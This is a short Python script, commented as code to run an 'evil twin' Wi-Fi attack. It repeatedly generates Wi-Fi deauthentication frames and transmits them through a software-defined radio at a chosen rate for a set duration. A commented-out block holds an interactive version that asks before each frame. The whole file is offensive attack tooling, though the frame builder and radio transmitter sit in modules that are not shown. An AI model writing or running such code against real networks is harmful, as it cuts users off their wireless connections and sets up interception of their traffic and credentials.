# code to run the evil twin attack
from attack import frames
from SDRtransmitTCP import transmitData
import time

def transmit_frame_deauth(params):
    duration = int(params[0])
    rate = float(params[1])
    start_time = time.time()
    while(time.time() - start_time < duration):
        raw_frame = frames.start_deauthentication_frame_generator()
        transmitData(raw_frame)
        time.sleep(1/rate)
    
    """
    while(True):
        choice = None
        while(True):
            choice = input("transmit deauth frame? (y/n): ")
            if choice in ["y", "n"]:
                break
            else:
                print("Invalid choice. Please enter a valid number.")
        
        if choice=="y":
            raw_frame = frames.start_deauthentication_frame_generator()
            print("transmitting now")
            transmitData(raw_frame)
        else:
            break
"""


